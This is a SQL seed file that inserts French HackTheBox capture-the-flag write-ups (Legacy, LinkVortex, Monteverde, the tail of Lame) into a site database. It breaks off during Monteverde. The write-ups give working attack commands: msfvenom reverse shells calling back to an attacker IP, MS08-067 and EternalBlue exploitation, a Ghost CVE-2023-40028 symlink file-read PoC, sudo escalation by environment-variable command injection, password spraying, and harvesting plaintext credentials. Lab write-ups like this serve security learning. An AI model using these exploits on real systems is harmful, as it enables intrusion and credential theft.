*   **Distccd** (3632) - Ce dernier était visible mais constitue un autre vecteur de **Remote Code Execution** (RCE) classique sur cette machine.

Cette configuration illustre l''importance de la segmentation réseau et du durcissement (**Hardening**) via pare-feu, même si les services eux-mêmes restent vulnérables.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['SMB', 'SQL', 'Privilege Escalation'],
  'Ma méthodologie débute par une phase de **Port Scanning** agressive pour identifier la surface d''attaque. J''utilise **nmap** avec une vitesse d''émission élevée pour un premier tri, suivi d''un scan de services détaillé. **Résultats du scan :** * **Por...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-lame-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Legacy
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Legacy',
  'htb-legacy',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### Phase 1 : Reconnaissance & Brèche Initiale

Ma méthodologie débute par une phase de **Reconnaissance** classique pour identifier la surface d''attaque. Étant donné l''âge de la machine **Legacy**, je m''attends à trouver des services legacy potentiellement vulnérables.

#### 1. Scanning & Énumération de services

Je commence par un scan **TCP** exhaustif pour identifier les ports ouverts, suivi d''un scan **UDP** pour ne rien manquer des services **NetBIOS**.

```bash
# Scan TCP rapide sur tous les ports
nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.4

# Scan UDP sur tous les ports
nmap -sU -p- --min-rate 10000 -oA nmap/alludp 10.10.10.4

# Scan de services (Version/Scripts) sur les ports identifiés
nmap -sC -sV -p 139,445 10.10.10.4
```

Le scan révèle les ports **139 (NetBIOS)** et **445 (SMB)**. L''empreinte du système d''exploitation (**OS Fingerprinting**) via les scripts **NSE** confirme qu''il s''agit d''un **Windows XP**.

#### 2. Énumération SMB

Je tente d''énumérer les partages via **Null Session** (sans authentification), mais les outils **smbmap** et **smbclient** retournent un accès refusé.

```bash
smbmap -H 10.10.10.4
smbclient -N -L //10.10.10.4
```

L''absence de **Null Auth** m''oriente vers la recherche de vulnérabilités critiques au niveau du protocole lui-même, plutôt que sur une mauvaise configuration des partages.

#### 3. Identification des vulnérabilités (Vulnerability Scanning)

Sur un système **Windows XP**, les vecteurs d''attaque via **SMB** sont historiquement nombreux. J''utilise les scripts **NSE** de **Nmap** ciblés sur les vulnérabilités **SMB**.

```bash
nmap --script smb-vuln* -p 445 10.10.10.4
```

Le résultat est sans appel : la cible est vulnérable à deux failles majeures permettant l''**Remote Code Execution (RCE)** :
*   **MS08-067** (CVE-2008-4250) : Une vulnérabilité dans le service **Server** via une requête **RPC** malformée.
*   **MS17-010** (EternalBlue - CVE-2017-0143) : La célèbre faille exploitée par WannaCry.

> **Schéma Mental :**
> L''objectif est d''exploiter **MS08-067**. Le script d''exploitation doit envoyer un chemin de fichier spécifiquement forgé au service **Server**. Lors de la **Canonicalization** (normalisation du chemin), un **Buffer Overflow** se produit dans la mémoire du système, permettant de détourner le flux d''exécution vers mon **Payload**.

#### 4. Brèche Initiale : Exploitation manuelle de MS08-067

Je choisis d''exploiter **MS08-067** sans utiliser Metasploit pour mieux comprendre le mécanisme. J''utilise un script Python public qui nécessite un **Payload** personnalisé.

**Étape A : Génération du Shellcode**
J''utilise **msfvenom** pour générer un **Reverse Shell** de type **Unstaged**. Je dois impérativement exclure les **Bad Characters** (caractères qui corrompent l''exploit en mémoire).

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```

**Étape B : Configuration de l''exploit**
J''insère le **shellcode** généré dans le script Python. Je dois également sélectionner la cible correcte (**Target ID**) pour que les adresses mémoires (**Return Addresses**) correspondent à la version exacte de l''OS. Ici, je cible **Windows XP SP3 English (NX)**.

**Étape C : Exécution et obtention du Shell**
Je prépare mon listener **Netcat** et lance l''attaque.

```bash
# Sur ma machine d''attaque
nc -lnvp 443

# Exécution de l''exploit (Target 6 = XP SP3 English NX)
python ms08-067.py 10.10.10.4 6 445
```

La connexion est établie immédiatement. Je reçois un shell avec les privilèges **NT AUTHORITY\SYSTEM**.

```cmd
C:\WINDOWS\system32> echo %username%
%username%
```

L''absence de réponse à la commande `whoami` (inexistante sur XP par défaut) et la non-expansion de la variable `%username%` confirment mon accès au niveau **SYSTEM**. La brèche est totale.

---

### Phase 2 : Énumération Interne & Mouvement Latéral

Une fois l''accès initial obtenu via l''exploitation de **SMB**, je me retrouve avec un **Reverse Shell** sur une machine Windows XP. Contrairement aux systèmes modernes, l''énumération post-exploitation sur cette version legacy présente des particularités, notamment l''absence de certains outils natifs.

#### 1. Exploitation et Post-Exploitation via MS08-067

Pour obtenir un accès stable sans utiliser **Metasploit**, j''utilise un script Python exploitant la vulnérabilité **MS08-067**. Cette faille permet une **Remote Code Execution (RCE)** en envoyant une requête **RPC** forgée qui déclenche un **Stack Overflow** lors de la canonisation d''un chemin.

**Génération du Payload (Unstaged) :**
J''opte pour un payload **unstaged** (`windows/shell_reverse_tcp`) afin de pouvoir réceptionner la connexion simplement avec **Netcat**.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```

> **Schéma Mental :**
> 1. **Crafting** : Génération d''un **Shellcode** personnalisé en excluant les **Bad Characters** spécifiques au protocole SMB.
> 2. **Injection** : Remplacement du **Shellcode** statique dans l''exploit Python.
> 3. **Targeting** : Sélection de l''empreinte mémoire (OS version/Language pack) pour aligner les **Gadgets** (ROP) et rediriger le flux d''exécution vers mon **Payload**.

#### 2. Alternative : Mouvement Latéral via MS17-010 (EternalBlue)

Si l''exploitation de **MS08-067** échoue, j''utilise **MS17-010**. Cette vulnérabilité repose sur une corruption de mémoire dans le driver `srv.sys`. L''outil `send_and_execute.py` simplifie le processus en téléversant et en exécutant un binaire de manière automatisée.

**Préparation de l''exécutable malveillant :**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev.exe
python send_and_execute.py 10.10.10.4 rev.exe
```

#### 3. Énumération Interne & Vérification des Privilèges

Sur Windows XP, la commande `whoami` n''existe pas nativement. Pour confirmer mon niveau de privilège, je dois utiliser des méthodes alternatives ou importer mes propres outils.

**Vérification via variables d''environnement :**
La variable `%username%` ne s''exécute pas correctement si la session tourne sous le compte **SYSTEM**.
```cmd
echo %username%
# Si la sortie est "%username%", cela indique souvent un contexte SYSTEM ou un environnement restreint.
```

**Importation d''outils via SMB Pivot :**
Pour obtenir une confirmation formelle, je monte un partage **SMB** local pour exécuter un binaire `whoami.exe` provenant de ma machine d''attaque.

```bash
# Sur la machine d''attaque (Kali)
impacket-smbserver share /usr/share/windows-binaries/
```

```cmd
# Sur la machine cible (Legacy)
\\10.10.14.14\share\whoami.exe
```

> **Schéma Mental :**
> L''absence de binaires d''énumération impose la création d''un **Pivot** de fichiers. En utilisant le protocole **SMB** (déjà ouvert et autorisé), je contourne la nécessité de télécharger le fichier sur le disque (`Diskless execution` via le chemin UNC), ce qui réduit les traces forensiques.

#### 4. Accès aux Secrets

L''exploitation de ces vulnérabilités **SMB** me donne directement les privilèges **NT AUTHORITY\SYSTEM**. Il n''y a donc pas de phase d''**Escalade de Privilèges** supplémentaire requise. Je peux procéder à la récupération des flags :

```cmd
type "C:\Documents and Settings\john\Desktop\user.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

---

### Phase 3 : Élévation de Privilèges & Domination (Root/Admin)

Sur cette machine **Legacy**, l''étape d''**Exploitation** et d''**Élévation de Privilèges** est fusionnée. Les vulnérabilités identifiées ciblent des services s''exécutant avec les privilèges les plus élevés du système (**NT AUTHORITY\SYSTEM**). Je vais détailler ici deux vecteurs d''attaque manuels pour obtenir un accès total sans l''utilisation de Metasploit.

#### Vecteur 1 : Exploitation de MS08-067 (CVE-2008-4250)

Cette vulnérabilité critique réside dans le service **Server**. Elle permet une **Remote Code Execution (RCE)** via une requête RPC spécifiquement forgée qui déclenche un **Stack Overflow** lors de la canonisation d''un chemin d''accès.

> **Schéma Mental :** L''objectif est d''écraser l''adresse de retour (EIP) en mémoire via une corruption de pile dans `netapi32.dll`. Comme Windows XP ne possède pas de protections modernes comme l''ASLR de manière généralisée, je peux utiliser des adresses de gadgets statiques pour rediriger l''exécution vers mon **Shellcode**.

**1. Génération du Shellcode :**
J''utilise **msfvenom** pour générer un payload **Unstaged** (pour une utilisation directe avec `nc`). Je dois impérativement exclure les **Bad Characters** spécifiés dans le script d''exploitation.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```

**2. Exécution de l''exploit :**
Après avoir injecté le shellcode dans le script Python, je cible la version spécifique du système (**Windows XP SP3 English**) pour que les offsets de mémoire correspondent.

```bash
# Lancement du listener
nc -lnvp 443

# Exécution de l''exploit (Target 6 = XP SP3 English)
python ms08-067.py 10.10.10.4 6 445
```

#### Vecteur 2 : Vecteur Alternatif via MS17-010 (EternalBlue)

Si le premier vecteur échoue, j''utilise **MS17-010**, qui exploite une faille dans la gestion des paquets **SMBv1**.

> **Schéma Mental :** L''exploit utilise une confusion de type et un dépassement de tampon dans le noyau (Kernel) pour obtenir des droits **SYSTEM**. J''utilise une version modifiée de l''exploit qui permet l''upload et l''exécution d''un binaire arbitraire via des **Named Pipes**.

**1. Préparation du binaire malveillant :**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe
```

**2. Déploiement :**
J''utilise le script `send_and_execute.py` qui automatise la connexion, l''exploitation et l''exécution du binaire.

```bash
python send_and_execute.py 10.10.10.4 shell.exe
```

---

### Analyse Post-Exploitation "Beyond Root"

Une fois le **System Shell** obtenu, je constate une particularité propre aux systèmes Windows XP : l''absence de l''utilitaire **whoami**.

#### Problématique du contexte utilisateur
Sur un système moderne, `whoami` confirme immédiatement les privilèges. Sur XP, la variable d''environnement `%username%` peut être utilisée, mais elle ne s''étend souvent pas correctement dans un contexte de service **SYSTEM**.

```cmd
C:\WINDOWS\system32> echo %username%
%username%
```

#### Solution : Transfert de binaires via SMB
Pour confirmer mon identité de manière formelle, je transfère le binaire `whoami.exe` depuis ma machine d''attaque. J''utilise **Impacket-smbserver** pour créer un partage local, évitant ainsi d''écrire sur le disque de la cible (exécution via le réseau).

```bash
# Sur Kali : Partage du répertoire contenant les binaires Windows
impacket-smbserver tools /usr/share/windows-binaries/
```

```cmd
# Sur la cible : Exécution directe via le chemin UNC
\\10.10.14.14\tools\whoami.exe
```

**Résultat :** `NT AUTHORITY\SYSTEM`

#### Analyse de la surface d''attaque résiduelle
La compromission totale de **Legacy** démontre l''importance critique du **Patch Management**. Bien que la machine soit "Rootée", l''analyse montre que :
1.  **SMB Signing** était désactivé, facilitant l''interaction avec les services.
2.  Le service **Browser** (via `\pipe\browser`) était accessible de manière anonyme, servant de point d''entrée pour les appels RPC de **MS08-067**.
3.  L''absence de **DEP (Data Execution Prevention)** sur certains processus permettait une exécution de shellcode simplifiée en pile.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['SMB', 'Privilege Escalation'],
  'Ma méthodologie débute par une phase de **Reconnaissance** classique pour identifier la surface d''attaque. Étant donné l''âge de la machine **Legacy**, je m''attends à trouver des services legacy potentiellement vulnérables. Je commence par un scan **T...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-legacy-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: LinkVortex
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: LinkVortex',
  'htb-linkvortex',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### 1. External Enumeration & Service Scanning

Ma reconnaissance commence par un scan **Nmap** agressif pour identifier les ports ouverts et les services associés sur la cible `10.10.11.47`.

```bash
# Scan rapide des 65535 ports
nmap -p- --min-rate 10000 10.10.11.47

# Scan de version et scripts par défaut sur les ports identifiés
nmap -p 22,80 -sCV 10.10.11.47
```

Le scan révèle deux services standards :
*   **Port 22 (SSH)** : OpenSSH 8.9p1 (Ubuntu).
*   **Port 80 (HTTP)** : Serveur Apache. La réponse HTTP indique une redirection vers `http://linkvortex.htb/`.

L''absence de version précise pour Apache et la présence de directives de sécurité suggèrent un durcissement (Hardening) du serveur. J''ajoute immédiatement l''entrée dans mon fichier `/etc/hosts`.

### 2. Subdomain Fuzzing & Virtual Host Discovery

Le serveur utilise du **Host-based routing**. Je lance une énumération de sous-domaines avec **ffuf** pour découvrir des environnements de développement ou des interfaces cachées.

```bash
ffuf -u http://10.10.11.47 -H "Host: FUZZ.linkvortex.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

Le fuzzing identifie `dev.linkvortex.htb`. Après avoir mis à jour mon `/etc/hosts`, un nouveau scan **Nmap** sur ce sous-domaine révèle une information critique : un **Git repository** exposé.

> **Schéma Mental :**
> L''attaquant passe d''une IP nue à un nom de domaine, puis utilise le fuzzing de **Vhosts** pour trouver un environnement de `dev`. Souvent, ces environnements sont moins sécurisés et exposent des métadonnées comme le dossier `.git`, permettant de reconstruire le code source.

### 3. Exploitation du Git Leak & Credential Harvesting

Le répertoire `.git` est accessible publiquement. J''utilise **git-dumper** pour récupérer l''intégralité de l''historique et des fichiers du projet.

```bash
git-dumper http://dev.linkvortex.htb source/
cd source/
git status
```

L''analyse des modifications en attente (`git diff --cached`) dans le fichier `ghost/core/test/regression/api/admin/authentication.test.js` révèle un changement de mot de passe en clair dans un test unitaire :
*   **Password** : `OctopiFociPilfer45`

Bien que les identifiants par défaut du test ne fonctionnent pas, je tente une connexion sur l''instance **Ghost CMS** de `linkvortex.htb` avec l''adresse `admin@linkvortex.htb`. L''accès est validé, me donnant un accès **Authenticated** au panel d''administration.

### 4. Vecteur d''Entrée : CVE-2023-40028 (Ghost Arbitrary File Read)

L''instance tourne sous **Ghost 5.58**. Cette version est vulnérable à la **CVE-2023-40028**, une faille permettant de lire des fichiers arbitraires via l''upload d''archives ZIP contenant des **Symlinks**.

> **Schéma Mental :**
> Le CMS Ghost traite les fichiers ZIP importés pour la base de données ou les images. Si le moteur de décompression ne vérifie pas la présence de liens symboliques, un attaquant peut créer un lien pointant vers un fichier sensible du système (ex: `/etc/passwd`). Lors de l''accès au fichier via le serveur web, Ghost suit le lien et sert le contenu du fichier ciblé.

#### Création du Payload (Manual POC)
Je crée une archive ZIP contenant un lien symbolique pointant vers le fichier de configuration de Ghost.

```bash
# Création du lien symbolique
ln -s /var/lib/ghost/config.production.json content/images/exploit.png

# Création de l''archive en préservant les liens symboliques (-y)
zip -y -r poc.zip content/images/exploit.png
```

#### Exploitation via l''API Admin
J''utilise le cookie de session de mon navigateur pour uploader l''archive sur le endpoint `/ghost/api/admin/db`.

```bash
curl http://linkvortex.htb/ghost/api/admin/db \
-F "importfile=@poc.zip" \
-b ''ghost-admin-api-session=[COOKIE]''
```

Une fois l''upload réussi, je peux lire le fichier en accédant directement à l''URL de l''image "malveillante" :

```bash
curl -b ''ghost-admin-api-session=[COOKIE]'' http://linkvortex.htb/content/images/exploit.png
```

### 5. Premier Shell : Accès SSH (Bob)

La lecture de `config.production.json` expose les paramètres **SMTP** du site, incluant des identifiants valides pour l''utilisateur `bob`.

```json
"auth": {
  "user": "bob@linkvortex.htb",
  "pass": "fibber-talented-worth"
}
```

Je teste ces credentials sur le service **SSH** et j''obtiens mon premier accès stable sur la machine.

```bash
ssh bob@linkvortex.htb
# Password: fibber-talented-worth
```

L''énumération locale peut maintenant commencer pour la phase d''élévation de privilèges.

---

### Mouvement Latéral : Accès SSH (Bob)

Après avoir exploité la vulnérabilité **Arbitrary File Read** (CVE-2023-40028) sur l''instance **Ghost CMS**, j''ai pu récupérer le fichier de configuration `/var/lib/ghost/config.production.json`. Ce fichier contient des identifiants en clair pour le service **SMTP**.

```bash
# Lecture du fichier de configuration via le script d''exploitation
python3 exploit.py http://linkvortex.htb admin@linkvortex.htb ''OctopiFociPilfer45'' /var/lib/ghost/config.production.json
```

Le bloc `mail` révèle les credentials de l''utilisateur **bob** : `bob@linkvortex.htb` / `fibber-talented-worth`. Ces identifiants sont valides pour une session **SSH**.

```bash
# Connexion initiale
ssh bob@linkvortex.htb
```

---

### Énumération Interne & Post-Exploitation

Une fois sur la machine, ma première action est de vérifier les privilèges **Sudo**.

```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

**Points critiques identifiés :**
1.  **Privilège Sudo** : Je peux exécuter `/opt/ghost/clean_symlink.sh` en tant que **root** sans mot de passe, à condition que l''argument se termine par `.png`.
2.  **Environment Variable** : La variable d''environnement `CHECK_CONTENT` est préservée lors de l''exécution via `env_keep`.

---

### Analyse du Script `clean_symlink.sh`

Le script est conçu pour nettoyer les **Symlinks** malveillants en les déplaçant vers un répertoire de quarantaine (`/var/quarantined`).

> **Schéma Mental : Logique du Script**
> 1. Vérifie si l''argument est un **Symlink** (`test -L`).
> 2. Vérifie si la cible du lien contient "etc" ou "root" via `grep`.
> 3. Si "safe" : Déplace le lien vers `/var/quarantined/`.
> 4. Si `CHECK_CONTENT` est `true` : Exécute `cat` sur le fichier déplacé.

---

### Escalade de Privilèges (Root)

J''ai identifié trois vecteurs d''attaque pour détourner ce script et obtenir les privilèges **root**.

#### Vecteur 1 : Double Symlinks (Contournement de Logique)
Le script utilise `readlink` pour vérifier la cible, mais il ne le fait pas de manière récursive. Si je pointe un **Symlink** vers un autre **Symlink**, le `grep` ne verra que le chemin intermédiaire.

```bash
# Création de la chaîne de liens
ln -s /root/root.txt /home/bob/.cache/link_b
ln -s /home/bob/.cache/link_b /home/bob/.cache/exploit.png

# Exécution avec CHECK_CONTENT pour lire le flag
CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/.cache/exploit.png
```

#### Vecteur 2 : TOCTOU (Race Condition)
Il existe un délai entre le moment où le script vérifie la cible du lien (**Time-of-Check**) et le moment où il affiche son contenu (**Time-of-Use**). Je peux exploiter cette fenêtre pour modifier la cible du lien.

```bash
# Terminal 1 : Boucle de remplacement rapide
while true; do ln -sf /root/root.txt /var/quarantined/race.png; done

# Terminal 2 : Exécution du script sur un lien initialement "safe"
ln -s /etc/hostname /dev/shm/race.png
CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /dev/shm/race.png
```

#### Vecteur 3 : Injection de Commande via Variable d''Environnement
C''est la méthode la plus directe. Le script contient la ligne suivante : `if $CHECK_CONTENT; then`. Ici, `$CHECK_CONTENT` n''est pas évalué comme un booléen mais exécuté comme une commande. Comme je contrôle cette variable et qu''elle est conservée par **sudo**, je peux injecter un shell.

> **Schéma Mental : Injection de Variable**
> Le script exécute littéralement la valeur de la variable. Si `CHECK_CONTENT="bash"`, le script exécute `bash` avec les privilèges **root** au sein de la condition `if`.

```bash
# Préparation d''un symlink factice pour passer le premier test -L
ln -s /etc/hostname /tmp/trigger.png

# Élévation de privilèges
CHECK_CONTENT="bash" sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/trigger.png
```

Une fois le shell **root** obtenu, je peux stabiliser le terminal et lire les preuves finales.

```bash
root@linkvortex:~# id
uid=0(root) gid=0(root) groups=0(root)
root@linkvortex:~# cat /root/root.txt
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l''accès initial établi en tant que **bob**, l''objectif est d''identifier des vecteurs d''escalade vers l''utilisateur **root**. L''énumération standard des privilèges **Sudo** révèle une configuration intéressante.

#### Énumération des privilèges Sudo

Je commence par vérifier les droits de **bob** avec `sudo -l` :

```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

Le script `/opt/ghost/clean_symlink.sh` peut être exécuté avec les privilèges de n''importe quel utilisateur sans mot de passe, à condition que l''argument se termine par `.png`. De plus, la variable d''environnement `CHECK_CONTENT` est préservée via `env_keep`.

#### Analyse du script clean_symlink.sh

Le script effectue les opérations suivantes :
1. Il vérifie si l''argument est un **Symbolic Link** (`test -L`).
2. Il extrait la cible du lien via `readlink`.
3. Il utilise `grep` pour bloquer les cibles contenant les chaînes "etc" ou "root".
4. Si le test réussit, il déplace le lien vers `/var/quarantined/`.
5. Si `CHECK_CONTENT` est évalué à **true**, il exécute `cat` sur le fichier déplacé.

> **Schéma Mental :** La vulnérabilité réside dans la confiance accordée à la structure du lien symbolique et dans l''évaluation non sécurisée de la variable d''environnement. Le script tente de filtrer le contenu par une liste noire (Blacklist) de mots-clés, ce qui est structurellement fragile.

#### Vecteur 1 : Double Symlinks (Bypass de filtre)

Le script vérifie uniquement la cible directe du premier lien. Si je crée une chaîne de liens, le `readlink` initial ne verra pas la destination finale interdite.

```bash
# Création de la chaîne : a.png -> b -> /root/root.txt
ln -s /root/root.txt /home/bob/.cache/b
ln -s /home/bob/.cache/b /home/bob/.cache/a.png

# Exécution avec CHECK_CONTENT pour lire le flag
CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/.cache/a.png
```

#### Vecteur 2 : TOCTOU (Time-of-Check to Time-of-Use)

Il existe un délai entre le moment où le script vérifie la cible du lien et le moment où il exécute `cat`. Je peux exploiter cette **Race Condition**.

```bash
# Terminal 1 : Boucle infinie pour remplacer le lien après le déplacement
while true; do ln -sf /root/root.txt /var/quarantined/toctou.png; done

# Terminal 2 : Création d''un lien légitime et exécution du script
ln -s /home/bob/.bashrc /dev/shm/toctou.png
CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /dev/shm/toctou.png
```

#### Vecteur 3 : Arbitrary Command Execution (Vecteur Optimal)

La faille la plus critique se situe dans l''instruction `if $CHECK_CONTENT; then`. En Bash, si une variable est placée directement après un `if`, elle est exécutée comme une commande. Je peux donc injecter `bash` pour obtenir un shell **root** instantanément.

```bash
# Création d''un lien symbolique quelconque pour passer le premier check
ln -s /tmp/dummy.png /tmp/exploit.png

# Injection de commande via la variable d''environnement
CHECK_CONTENT=bash sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/exploit.png
```

Une fois le shell obtenu, je peux stabiliser l''accès en lisant la **SSH Private Key** de root ou en lisant directement le flag :

```bash
root@linkvortex:~# cat /root/root.txt
0a2801b6************************
```

---

### Beyond Root : Analyse de la configuration Apache

Lors de la phase de reconnaissance, j''ai noté que le serveur **Apache** ne divulguait aucune version dans les en-têtes HTTP ou sur les pages d''erreur 404. L''analyse post-exploitation du fichier `/etc/apache2/sites-enabled/vhost.conf` confirme l''application de mesures de **Hardening**.

#### Directives de sécurité identifiées

Le fichier de configuration contient les directives suivantes :

```apache
ServerSignature Off
ServerTokens Prod
```

**Analyse technique :**
*   **ServerSignature Off** : Supprime la ligne de pied de page générée par le serveur sur les documents d''erreur (404, 403, etc.), empêchant ainsi l''exposition du nom d''hôte et de la version.
*   **ServerTokens Prod** : Modifie l''en-tête de réponse HTTP `Server`. Au lieu d''envoyer `Server: Apache/2.4.52 (Ubuntu)`, le serveur renvoie uniquement `Server: Apache`.

> **Schéma Mental :** Cette approche suit le principe de **Security through Obscurity**. Bien qu''elle ne corrige aucune vulnérabilité réelle, elle ralentit la phase d''énumération d''un attaquant en masquant la **Surface d''Attaque** précise (versions spécifiques de l''OS et du service).

Pour restaurer la visibilité totale lors de mes tests, j''ai modifié ces valeurs :
1. Commenter `ServerTokens Prod` permet de voir la version exacte dans les headers.
2. Commenter `ServerSignature Off` réactive le footer détaillé sur les pages 404.

Cette configuration est une bonne pratique standard pour limiter la fuite d''informations (Information Leakage) en environnement de production.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'Privilege Escalation'],
  'Ma reconnaissance commence par un scan **Nmap** agressif pour identifier les ports ouverts et les services associés sur la cible `10.10.11.47`. Le scan révèle deux services standards : * **Port 22 (SSH)** : OpenSSH 8.9p1 (Ubuntu). * **Port 80 (HTTP)*...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-linkvortex-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Monteverde
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Monteverde',
  'htb-monteverde',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

# Phase 1 : Reconnaissance & Brèche Initiale

L''objectif de cette phase est d''identifier la surface d''attaque d''une machine Windows typique d''un environnement **Active Directory** et d''obtenir un premier point d''appui via une faiblesse de politique de mots de passe.

### Énumération des Services (Scanning)

Je commence par un scan **Nmap** complet pour identifier les ports ouverts et les services associés.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.172

# Scan détaillé des services identifiés
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.172
```

L''analyse des résultats révèle un **Domain Controller** (ports 88/Kerberos, 389/LDAP, 53/DNS). Le nom de domaine est identifié comme `MEGABANK.LOCAL`. Le port 5985 (**WinRM**) est également ouvert, ce qui suggère un vecteur potentiel pour un shell distant si des identifiants sont compromis.

### Énumération RPC & Extraction d''Utilisateurs

Les tentatives d''énumération **SMB** anonymes via `smbclient` ou `smbmap` ne donnent aucun résultat probant (accès refusé). Cependant, le service **MSRPC** (port 135/445) autorise une **Null Session**, me permettant d''interroger la base **SAM** via `rpcclient`.

```bash
# Connexion RPC anonyme
rpcclient -U "" -N 10.10.10.172

# Extraction de la liste des utilisateurs
rpcclient $> querydispinfo
```

Je récupère une liste d''utilisateurs critiques pour la suite :
*   `AAD_987d7f2f57d2` (lié à Azure AD Connect)
*   `SABatchJobs`
*   `mhope`
*   `smorgan`
*   `dgalanos`
*   `roleary`

### Vecteur d''Entrée : Password Spraying

Avec une liste d''utilisateurs valides, je teste une vulnérabilité courante : l''utilisation du nom d''utilisateur comme mot de passe (**Username as Password**). C''est une forme de **Password Spraying** qui évite le verrouillage de compte si l''on ne teste qu''une seule itération par utilisateur.

> **Schéma Mental :**
> Liste d''utilisateurs (RPC) -> Test de mot de passe faible (User=Pass) -> Validation via SMB -> Accès aux partages.

```bash
# Test de Password Spraying avec CrackMapExec
crackmapexec smb 10.10.10.172 -u users.txt -p users.txt --continue-on-success
```

Le scan confirme une correspondance positive : `MEGABANK.LOCAL\SABatchJobs:SABatchJobs`.

### Exploitation SMB & Découverte de Secrets

En utilisant les identifiants de `SABatchJobs`, je ré-énumère les partages **SMB**. Le partage `users$` s''avère lisible.

```bash
# Lister les partages avec les credentials obtenus
smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs

# Exploration récursive du partage users$
smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R ''users$''
```

Je découvre un fichier nommé `azure.xml` dans le répertoire personnel de l''utilisateur `mhope` (`\mhope\azure.xml`).

```bash
# Téléchargement du fichier via smbclient
smbclient -U SABatchJobs //10.10.10.172/users$ -c ''get mhope/azure.xml azure.xml''
```

Le contenu du fichier révèle un mot de passe en clair au sein d''un objet `PSADPasswordCredential` : `4n0therD4y@n0th3r$`.

### Accès Initial via WinRM

Le fichier ayant été trouvé dans le dossier de `mhope`, il est logique de tester ce mot de passe pour cet utilisateur. Je vérifie l''accès via le service **WinRM**.

```bash
# Validation des credentials pour WinRM
crackmapexec winrm 10.10.10.172 -u mhope -p ''4n0therD4y@n0th3r$''
```

